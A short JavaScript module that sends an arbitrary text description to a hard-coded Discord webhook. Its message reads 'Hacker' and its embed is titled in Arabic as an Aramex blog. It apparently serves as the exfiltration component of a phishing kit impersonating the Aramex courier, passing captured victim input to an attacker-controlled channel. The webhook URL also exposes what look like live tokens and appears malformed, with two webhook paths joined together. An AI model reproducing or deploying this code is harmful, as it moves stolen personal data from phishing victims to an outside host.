import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1326101864617345046/i_XS_ZKdefLx3NTBURVA-AErixf3oeIYTGKaVxlfphfCbwljyvxK1fL3OywUHaVjtM_rapi/webhooks/1325927501863587890/v1YAc-FtTNOpPBMSmhQICSGqLjvnVzpz3dftckpX1wnk-FXN1CztNgqn7aaWkc56lck-",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
